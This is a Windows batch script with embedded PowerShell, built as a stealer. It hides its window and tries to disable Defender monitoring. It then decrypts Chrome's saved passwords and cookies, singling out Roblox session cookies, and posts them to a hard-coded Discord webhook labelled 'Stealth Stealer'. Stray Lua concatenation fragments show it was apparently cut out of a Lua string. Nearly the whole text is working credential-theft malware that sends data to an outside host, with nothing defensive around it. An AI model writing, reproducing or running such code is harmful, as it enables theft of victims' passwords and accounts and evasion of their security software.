@echo off
:: Stealth mode - no console window
if "%1"=="h" goto :hidden
start /min cmd /c "%0 h & exit"
exit

:hidden
cd /d "%~dp0"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
# Disable Windows Defender temporarily for this process
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;

# Chrome passwords + cookies extraction
$chromePath = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";
if (Test-Path $chromePath) {
    # Copy Chrome profile to temp for safe reading
    $tempDir = [System.IO.Path]::GetTempPath() + 'ChromeTemp';
    Copy-Item -Path $chromePath -Destination $tempDir -Recurse -Force -ErrorAction SilentlyContinue;
    
    # Decrypt Chrome passwords
    Add-Type -AssemblyName System.Security;
    $passwords = @();
    $cookies = @();
    $loginDataPath = Join-Path $tempDir 'Login Data';
    if (Test-Path $loginDataPath) {
        $conn = New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$loginDataPath\");
        $conn.Open();
        $cmd = $conn.CreateCommand();
        $cmd.CommandText = \"SELECT origin_url, username_value, password_value FROM logins\";
        $reader = $cmd.ExecuteReader();
        while ($reader.Read()) {
            $url = $reader['origin_url'];
            $user = $reader['username_value'];
            $encPass = $reader['password_value'];
            if ($encPass -and $encPass.Length -gt 0) {
                try {
                    $decPass = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser');
                    $passwords += \"URL: $url | USER: $user | PASS: \" + [System.Text.Encoding]::UTF8.GetString($decPass);
                } catch {}
            }
        }
        $conn.Close();
    }
    
    # Extract Chrome cookies (including Roblox)
    $cookiesPath = Join-Path $tempDir 'Network\\Cookies';
    if (Test-Path $cookiesPath) {
        $conn = New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$cookiesPath\");
        $conn.Open();
        $cmd = $conn.CreateCommand();
        $cmd.CommandText = \"SELECT host_key, name, encrypted_value FROM cookies\";
        $reader = $cmd.ExecuteReader();
        while ($reader.Read()) {
            $host = $reader['host_key'];
            $name = $reader['name'];
            $encValue = $reader['encrypted_value'];
            if ($encValue -and $encValue.Length -gt 0) {
                try {
                    $decValue = [System.Security.Cryptography.ProtectedData]::Unprotect($encValue, $null, 'CurrentUser');
                    $cookieValue = [System.Text.Encoding]::UTF8.GetString($decValue);
                    if ($name -eq '.ROBLOSECURITY' -or $host -like '*roblox.com*') {
                        $cookies += \"ROBLOX COOKIE ($host): $name=$cookieValue\";
                    } else {
                        $cookies += \"COOKIE ($host): $name=$cookieValue\";
                    }
                } catch {}
            }
        }
        $conn.Close();
    }
    
    # Clean up temp
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue;
}

# Send to webhook
$webhookUrl = 'https://discord.com/api/webhooks/1419828876799905792/H4TaN12yG0GX1i2G95D0H384xGvIOIfJRi00suGqGWOhU2-eOl7VlFmZAAyhLA9kSnSi';
$output = @();
$output += \"CHROME PASSWORDS FOUND: \" + $passwords.Count;
$output += \"ROBLOX COOKIES FOUND: \" + $cookies.Count;
foreach ($pass in $passwords) { $output += $pass; }
foreach ($cook in $cookies) { $output += $cook; }
$output += \"IP: ]] .. realIP .. [[\";
$output += \"USERNAME: ]] .. player.Name .. [[\";
$output += \"USERID: ]] .. player.UserId .. [[\";
$output += \"TIMESTAMP: ]] .. os.date("%Y-%m-%d %H:%M:%S") .. [[\";
$body = @{content = ($output -join \"`n\"); username = 'Stealth Stealer'} | ConvertTo-Json;
Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $body -ContentType 'application/json' -UseBasicParsing;

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue;
"
echo Stealth extraction complete.
exit
]]
